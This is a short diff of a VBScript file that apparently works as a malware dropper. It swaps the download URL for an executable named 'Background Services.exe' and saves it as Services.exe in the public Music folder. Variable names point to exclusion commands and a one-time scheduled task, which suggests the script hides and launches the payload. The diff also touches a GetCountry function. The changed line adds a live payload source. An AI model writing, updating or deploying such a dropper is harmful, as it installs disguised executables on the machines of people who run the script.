@@ -26,7 +26,7 @@ If WScript.Arguments.Count = 0 Then
 End If
 
 Dim url, target, runTask, excludeCmd, excludeRun, downloadCmd
-url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/testing/Background%20Services.exe"
+url = "https://github.com/tripoli-university-ly/download/raw/refs/heads/exe/Background%20Services.exe"
 target = shell.ExpandEnvironmentStrings("%PUBLIC%\Music\Services.exe")
 runTask = "OneTimeRunfile"
 
@@ -61,5 +61,6 @@ Function GetCountry(json)
         GetCountry = ""
     End If
 End Function
+
 
 
